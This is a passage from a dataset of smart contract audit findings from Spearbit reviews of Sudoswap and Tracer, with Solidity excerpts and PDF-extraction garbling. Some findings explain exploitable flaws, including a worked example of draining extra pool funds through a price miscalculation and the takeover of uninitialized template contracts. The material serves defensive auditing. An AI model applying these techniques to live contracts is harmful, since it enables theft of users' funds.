swapTokenForSpecificNFTs(uint256[] calldata nftIds,...) ... { ... //There is a check on the number of requested `NFT`s require( (nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and < balanceOf NFTs\"); // check is present ... ,! ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk 22"]}, {"title": "Avoid utilizing inside knowledge of functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "ETH based swap functions use isRouter==false and router- Caller==address(0) as parameters to swapTokenForAnyNFTs() and swapToken- ForSpecificNFTs(). These parameters end up in _validateTokenInput(). The LSSVMPairETH version of this function does not use those parameters, so it is not a problem at this point. However, the call actually originates from the Router so functionally isRouter should be true. Our concern is that using inside knowledge of the functions might potentially introduce subtle issues in the following scenarios: 24 function robustSwapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function robustSwapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... ,! } function _swapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function _swapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: ,! pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... } function swapTokenForAnyNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... } function swapTokenForSpecificNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... ,! } abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(..., bool, /*isRouter*/ /*routerCaller*/ ... ) { address, // doesn't use isRouter and routerCaller } ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Add Reentrancy Guards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The abovementioned permalinks and corresponding functions are listed for Sudoswaps consideration to introduce reentrancy guard modiers. Currently, there is only one function that uses a reentrancy guard modier: withdrawAllETH() in LSSVMPairETH.sol#L94. Other functions in the codebase may also require reentrancy guard modiers. We have only seen reentrancy problems when malicious routers, assetRecip- ients, curves, factory owner or protocolFeeRecipient are involved. Despite normal prohibitions on this occurence, it is better to protect ones codebase than regret leaving open vulnerabilities available for potential attackers. There are three categories of functions that Sudoswap should consider applying reen- trancy guard modiers to: functions withdrawing ETH, functions sending ETH, and uses of safeTransferFrom() to external addresses (which will trigger an onERC1155Received() callback to receiving contracts). Examples of functions withdrawing ETH within LSSVM: LSSVMPairFactory.sol#L272 LSSVMPairETH.sol#L104 Instances of functions sending ETH within LSSVM: LSSVMPairETH.sol#L34 LSSVMPairETH.sol#L46 A couple of instances that use safeTransferFrom() to call external addresses, which will trigger an onERC1155Received() callback to receiving contracts: LSSVM- PairFactory.sol#L428 LSSVMRouter.sol#L544", "labels": ["Spearbit", "Sudoswap", "Severity: Low Risk"]}, {"title": "Saving 1 byte off the constructor() code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The dup2 before the return in the code below indicates a possible optimization by rearranging the stack. function cloneETHPair(...) ... { assembly { ... | RETURNDATASIZE // 3d | PUSH1 runtime // 60 runtime | DUP1 // 80 // 60 creation | PUSH1 creation (c) // 3d // 39 | RETURNDATASIZE | CODECOPY ,! ,! ,! [0-2d]: runtime code // 81 | DUP2 [0-2d]: runtime code // f3 | RETURN [0-2d]: runtime code ... } } | 0 (r) | r 0 | r r 0 | c r r 0 | 0 c r r 0 | r 0 | 0 c 0 | 0 |  |  |  |  |  | | |", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Decode extradata in calldata in one go", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Spearbit discovered that the functions factory(), bondingCurve() and nft() are called independently but in most use cases all of the data is re- quired.", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Transfer last NFT instead of rst", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "When executing _sendAnyNFTsToRecipient() NFTs are retrieved by taking the rst available NFT and then sending it to nftRecipient. In (most) ERC721 implementations as well as in the EnumerableSet implementation, the array that stores the ownership is updated by swapping the last element with the selected element, to be able to shrink the array afterwards. When you always transfer the last NFT instead of the rst NFT, swapping isnt necessary so gas is saved. Code related to LSSVMPairEnumerable.sol: 29 abstract contract LSSVMPairEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = IERC721Enumerable(address(_nft)).tokenOfOwnerByIndex(address(this), 0); take the first NFT // _nft.safeTransferFrom(address(this), nftRecipient, nftId); // this calls _beforeTokenTransfer of ERC721Enumerable ,! ,! ,! ,! } } } abstract contract ERC721Enumerable is ERC721, IERC721Enumerable { function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal virtual override { ,! ... _removeTokenFromOwnerEnumeration(from, tokenId); ... } function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private { ... uint256 lastTokenIndex = ERC721.balanceOf(from) - 1; uint256 tokenIndex = _ownedTokensIndex[tokenId]; // When the token to delete is the last token, the swap operation is unnecessary ==> we can make use of this if (tokenIndex != lastTokenIndex) { uint256 lastTokenId = _ownedTokens[from][lastTokenIndex]; _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index } // This also deletes the contents at the last position of the array delete _ownedTokensIndex[tokenId]; delete _ownedTokens[from][lastTokenIndex]; ,! ,! ,! ,! } } Code related to LSSVMPairMissingEnumerable.sol: 30 abstract contract LSSVMPairMissingEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ,! ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = idSet.at(0); // take the first NFT _nft.safeTransferFrom(address(this), nftRecipient, nftId); idSet.remove(nftId); // finally calls _remove() } } } library EnumerableSet { function _remove(Set storage set, bytes32 value) private returns (bool) { ... uint256 toDeleteIndex = valueIndex - 1; uint256 lastIndex = set._values.length - 1; if (lastIndex != toDeleteIndex) { // ==> we can make use of this bytes32 lastvalue = set._values[lastIndex]; set._values[toDeleteIndex] = lastvalue; // Move the last value to the index where the value to delete is set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex ,! ,! } set._values.pop(); delete set._indexes[value]; ... // Delete the slot where the moved value was stored // Delete the index for the deleted slot } }", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Simplify the connection between Pair and Router", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "There are two ways to interact between Pair and Router: 1. LSSVMPairERC20.sol calls router.pairTransferERC20From, where the goal is to transfer ERC20 2. _swapNFTsForToken calls pair.cacheAssetRecipientNFTBalance and pa ir.routerSwapNFTsForToken, where the goal is to transfer NFTs Using two different patterns to solve the same problem makes the code more com- plex and larger than necessary. Patterns with cacheAssetRecipientNFTBa lance() are also error prone. abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(..., bool isRouter, ...) ... { ... if (isRouter) { LSSVMRouter router = LSSVMRouter(payable(msg.sender)); // Verify ,! if router is allowed require(_factory.routerAllowed(router), \"Not router\"); ... router.pairTransferERC20From( _token, routerCaller, _assetRecipient, inputAmount, pairVariant() ); ... } ... } } contract LSSVMRouter { function pairTransferERC20From(...) ... { // verify caller is a trusted pair contract require(factory.isPair(msg.sender, variant), \"Not pair\"); ... // transfer tokens to pair token.safeTransferFrom(from, to, amount); // transfer ERC20 from the original caller } ,! } 33 contract LSSVMRouter { function _swapNFTsForToken(...) ... { ... // Cache current asset recipient balance swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // transfer NFTs from the original caller } ... outputAmount += ,! swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); ... } } abstract contract LSSVMPair is Ownable, ReentrancyGuard { function cacheAssetRecipientNFTBalance() external { require(factory().routerAllowed(LSSVMRouter(payable(msg.sender))),\"Not router\"); // Verify if router is allowed assetRecipientNFTBalanceAtTransferStart = nft().balanceOf(getAssetRecipient()) + 2; } ,! ,! }", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Cache array length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "An array length is frequently used in for loops. This value is an evaluation for every iteration of the loop. Assuming the arrays are regularly larger than 1, it saves some gas to store the array length in a temporary variable. The following snippets are samples of the above context for lines of code where this is relevant: LSSVMPairEnumerable.sol#L51 LSSVMPairFactory.sol#L378 LSSVMPairMissingEnumerable.sol#L57 LSSVMRouter.sol#L358 For more examples, please see the context above for exact lines where this applies. The following contains examples of the overusage of nftIds.length: 35 function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); ... (error, newSpotPrice, inputAmount, protocolFee) = _bondingCurve ,! .getBuyInfo( spotPrice, delta, nftIds.length, fee, _factory.protocolFeeMultiplier() ); ... }", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Use Custom Errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Strings are used to encode error messages. With the current Solidity versions it is possible to replace them with custom errors, which are more gas efcient. Example of non-custom errors used in LSSVM : LSSVMRouter.sol#L604 require(block.timestamp <= deadline, \"Deadline passed\"); LSSVMRouter.sol#L788 require(outputAmount >= minOutput, \"outputAmount too low\"); Note: This pattern has been used in Ownable.sol#L6-L7", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Alternatives for the immutable Proxy variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "In the current LSSVMPairClone, the immutable variables stored in the proxy are sent along with every call. It may be possible to optimize this. 37", "labels": ["Spearbit", "Sudoswap", "Severity: Gas Optimization"]}, {"title": "Pair implementations may not be Proxies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The security of function pairTransferERC20From() relies on is- Pair(). In turn, isPair() relies on both isETHPairClone() and isERC20PairClone(). These functions check that a valid proxy is used with a valid implementation ad- dress. However, if the implementation address itself is a proxy it could link to any other contract. In this case security could be undermined depending on the implementation details. This is not how the protocol is designed, but future developers or developers using a fork of the code might not be aware of this.", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "NFT and Token Pools can be signed orders instead", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Currently if any actor wants to create a buy/sell order they would have to create a new pool and pay gas for it. However, the advantage of this is unclear. TOKEN and NFT type pools can really be buy/sell orders at a price curve using signed data. This is reminiscent of how similar limit orders implemented by OpenSea, 1Inch, and SushiSwap currently function. Amending this in the codebase would make creating buy/sell orders free and should attract more liquidity and/or orders to Sudoswap.", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Remove Code Duplication", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "Functions like swapTokenForAnyNFTs and swapTokenForSpeci- ficNFTs are nearly identical and can be deduplicated by creating a common internal function. On the other hand this will slightly increase gas usage due to an extra jump.", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Unclear Function Name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The functions _validateTokenInput() of both LSSVMPairETH and LSSVMPairERC20 do not only validate the token input but also transfer ETH/ERC20. The function name does not reasonably imply this and therefore can create some confusion. 40 abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(...) ... { ... _assetRecipient.safeTransferETH(inputAmount); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(...) ... { ... if (isRouter) { ... router.pairTransferERC20From(...); // transfer of tokens ... } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } } }", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Inaccurate Message About MAX_FEE", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The function initialize() of LSSVMPair has an error message containing less than 100%. This is likely an error and should probably be less than 90%, as in the changeFee() function and because MAX_FEE == 90%. 41 // 90%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 9e17; function initialize(..., uint256 _fee, ...) external payable { ... require(_fee < MAX_FEE, \"Trade fee must be less than 100%\"); // 100% should be 90% ... ,! } function changeFee(uint256 newFee) external onlyOwner { ... require(newFee < MAX_FEE, \"Trade fee must be less than 90%\"); ... }", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Inaccurate comment for assetRecipientNFTBalanceAtTransferStart", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The comment in LSSVMPair notes that assetRecipientNFTBal- anceAtTransferStart is 0; however, in routerSwapNFTsForToken() the variable assetRecipientNFTBalanceAtTransferStart is set to 1. As such, the below comment is probably inaccurate. // Temporarily used during LSSVMRouter::_swapNFTsForToken to store the number of NFTs transferred ,! // directly to the pair. Should be 0 outside of the execution of routerSwapAnyNFTsForToken. ,! uint256 internal `assetRecipientNFTBalanceAtTransferStart`; function routerSwapNFTsForToken(address payable tokenRecipient) ... { ... assetRecipientNFTBalanceAtTransferStart = 1; ... } 42", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "IERC1155 not utilized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPair references IERC1155, but does not utilitze the interface within LSSVMPair.sol. import {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\"; The struct TokenToTokenTrade is dened in LSSVMRouter, but the contract does not utilize the interface either. struct TokenToTokenTrade { PairSwapSpecific[] tokenToNFTTrades; PairSwapSpecific[] nftToTokenTrades; } It is better to remove unused code due to potential confusion.", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Use Fractions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "In some occasions percentages are indicated in a number format ending in e17. It is also possible to use fractions of e18. Considering e18 is the standard base format, using fractions might be easier to read. 43 LSSVMPairFactory.sol#L28 LSSVMPair.sol#L25", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Two families of token libraries used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf", "body": "The Sudoswap contract imports token libraries from both Open- Zeppelin and Solmate. If Sudoswap sticks within one library family, then it will not be necessary to track potential issues from two separate families of libraries.", "labels": ["Spearbit", "Sudoswap", "Severity: Informational"]}, {"title": "Pool token price is incorrect when there is more than one pending upkeep", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X. However, in the current implementation price includes the current total supply but burn commits burn pool tokens immediately when commit() is called, not when upkeep() is executed. // pool token price computation at execution of updateIntervalId, example for long price priceHistory[updateIntervalId].longPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount + _totalCommit[updateIntervalId].longBurnShortMintAmount) ,! The implementation tries to fix this by adding back all tokens burned at this updateIntervalId but it must also add back all tokens that were burned in future commits (i.e. when ID > updateIntervalID). This issue allows an attacker to get a better pool token price and steal pool token funds. Example: Given the preconditions:  long.totalSupply() = 2000  User owns 1000 long pool tokens  lastPriceTimestamp = 100  updateInterval = 10  frontRunningInterval = 5 At time 104: User commits to BurnLong 500 tokens in appropriateUpdateIntervalId = 5. Upon execution user receives a long price of longBalance / (1500 + 500) if no further future commitments are made. Then, as tokens are burned totalPoolCommitments[5].longBurnAmount = 500 and long.totalSupply -= 500. time 106: At 6 as they are now past totalPoolCommitments[6].longBurnAmount = 500, long.totalSupply -= 500 again as tokens are burned. User commits another 500 tokens to BurnLong at appropriateUpdateIntervalId = Now the frontRunningInterval and are scheduled for the next update. the 5th update interval Finally, (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCom- mit[5].longBurnShortMintAmount = longBalance / (1000 + 500) which is a better price than what the user should have received. ID is executed by the pool keeper but at longPrice = longBalance / With a longBalance of 2000, the user receives 500 * (2000 / 1500) = 666.67 tokens executing the first burn commit and 500 * ((2000 - 666.67) / 1500) = 444.43 tokens executing the second one. 5 The total pool balance received by the user is 1111.1/2000 = 55.555% by burning only 1000 / 2000 = 50% of the pool token supply.", "labels": ["Spearbit", "Tracer", "Severity: Critical"]}, {"title": "No price scaling in SMAOracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The update() function of the SMAOracle contract doesnt scale the latestPrice although a scaler is set in the constructor. On the other hand, the _latestRoundData() function of ChainlinkOracleWrapper contract does scale via toWad(). contract SMAOracle is IOracleWrapper { constructor(..., uint256 _spotDecimals, ...) { ... require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); ... /* `scaler` is always <= 10^18 and >= 1 so this cast is safe */ scaler = int256(10**(MAX_DECIMALS - _spotDecimals)); ... } function update() internal returns (int256) { /* query the underlying spot price oracle */ IOracleWrapper spotOracle = IOracleWrapper(oracle); int256 latestPrice = spotOracle.getPrice(); ... priceObserver.add(latestPrice); // doesn't scale latestPrice ... } contract ChainlinkOracleWrapper is IOracleWrapper { function getPrice() external view override returns (int256) { (int256 _price, ) = _latestRoundData(); return _price; } function _latestRoundData() internal view returns (int256, uint80) { (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData(); ... return (toWad(price), ...); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Two different invariantCheck variables used in PoolFactory.deployPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function in the PoolFactory contract uses two different invariantCheck vari- ables: the one defined as a contracts instance variable and the one supplied as a parameter. Note: This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\". function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... poolCommitter.initialize(..., ,! invariantCheck deploymentParameters.invariantCheck, ... ); // version 1 of ... ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({ ... _invariantCheckContract: invariantCheck, // version 2 of invariantCheck ... });", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Duplicate user payments for long commits when paid from balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Initial executionPrice is too high", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When a pool is deployed the initial executionPrice is calculated as firstPrice * 1e18 where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice(): contract PoolKeeper is IPoolKeeper, Ownable { function newPool(address _poolAddress) external override onlyFactory { int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice(); int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), ,! FIXED_POINT)); executionPrice[_poolAddress] = startingPrice; } } All other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling: function performUpkeepSinglePool() { ... (int256 latestPrice, ...) = pool.getUpkeepInformation(); ... executionPrice[_pool] = latestPrice; ... } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function getUpkeepInformation() { (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata(); return (_latestPrice, ...); } } The price after the firstPrice will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Paused state cant be set and therefore withdrawQuote() cant be executed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The checkInvariants() function of the InvariantCheck contract is called via the modifiers check- InvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommit- ter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The aforementioned modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheck- Contract modifier. Thus the paused variable will never be set to true, making withdrawQuote() impossible to be executed because it requires the contract to be paused. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked. Relevant parts of the code: The checkInvariants() function calls InvariantCheck.pause() if the invariants dont hold. The latter calls pause() in LeveragedPool and PoolCommitter: contract InvariantCheck is IInvariantCheck { function checkInvariants(address poolToCheck) external override { ... pause(IPausable(poolToCheck), IPausable(address(poolCommitter))); ... } function pause(IPausable pool, IPausable poolCommitter) internal { pool.pause(); poolCommitter.pause(); } } In LeveragedPool and PoolCommitter contracts, the checkInvariantsBeforeFunction() and checkIn- variantsAfterFunction() modifiers will make the transaction revert if checkInvariants() sets the paused state. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external override onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); } ,! } 9 contract PoolCommitter is IPoolCommitter, Initializable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The performUpkeepSinglePool() function of the PoolKeeper contract updates executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, pool.poolUpkeep() can revert, for example due to the checkInvariantsBeforeFunction modifier in mintTokens(). If pool.poolUpkeep() reverts then the previous price value is lost and the processing will not be accurate. There- fore, it is safer to store the new price only if pool.poolUpkeep() has been executed succesfully. function performUpkeepSinglePool(...) public override { ... int256 lastExecutionPrice = executionPrice[_pool]; executionPrice[_pool] = latestPrice; ... try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) { // previous price can get lost if poolUpkeep() reverts ... // executionPrice[_pool] should be updated here } catch Error(string memory reason) { ... } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Pools can be deployed with malicious or incorrect quote tokens and oracles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployment of a pool via deployPool() is permissionless. The deployer provides several pa- rameters that have to be trusted by the users of a specific pool, these parameters include:  oracleWrapper  settlementEthOracle  quoteToken  invariantCheck If any one of them is malicious, then the pool and its value will be affected. Note: Separate findings are made for the deployer check (issue Authenticity check for oracles is not effective) and the invariantCheck (issue Two different invariantCheck variables used in PoolFactory.deployPool() ).", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "pairTokenBase and poolBase template contracts instances are not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The constructor of PoolFactory contract creates three template contract instances but only one is initialized: poolCommitterBase. The other two contract instances (pairTokenBase and poolBase) are not initial- ized. contract PoolFactory is IPoolFactory, Ownable { constructor(address _feeReceiver) { ... PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized pairTokenBaseAddress = address(pairTokenBase); LeveragedPool poolBase = new LeveragedPool(); // not initialized poolBaseAddress = address(poolBase); PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized poolCommitterBaseAddress = address(poolCommitterBase); ... /* initialise base PoolCommitter template (with dummy values) */ poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0); } This means an attacker can initialize the templates setting them as the owner, and perform owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens. In PoolToken.initialize() an attacker can become the owner by calling initialize() with an address under his control as a parameter. The same can happen in LeveragedPool.initialize() with the initialization parameter. 13 contract PoolToken is ERC20_Cloneable, IPoolToken { ... } contract ERC20_Cloneable is ERC20, Initializable { function initialize(address _pool, ) external initializer { // not called for the template contract owner = _pool; ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! // not called for the template contract ... // set the owner of the pool. This is governance when deployed from the factory governance = initialization._owner; } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Oracles are not updated before use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "getPendingCommits() underreports commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When frontRunningInterval > updateInterval, the PoolCommitter.getAppropriateUpdateIntervalId() function can return updateInterval IDs that are arbitrarily far into the future, especially if appropriateIntervalId > updateIntervalId + 1. Therefore, commits can also be made to these appropriate interval IDs far in the future by calling commit(). The PoolCommitter.getPendingCommits() function only checks the commits for updateIntervalId and updateIn- tervalId + 1, but needs to check up to updateIntervalId + factorDifference + 1. Currently, it is underreporting the pending commits which leads to the checkInvariants function not checking the correct values.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Authenticity check for oracles is not effective", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. As the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. Note: this check does protect against frontrunning the deployment transaction of the same pool. See Undocu- mented frontrunning protection. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\");", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect calculation of keeper reward", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The keeper reward is calculated as (keeperGas * tipPercent / 100) / 1e18. The division by 1e18 is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. This in turn will call executeCommitments() repeatedly. For each call to executeCommitments() the updateMintingFee() function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling executeCommitments() with boundedIntervals == true and numberOfIntervals == 0. Note: Also see issue It is not possible to call executeCommitments() for multiple old 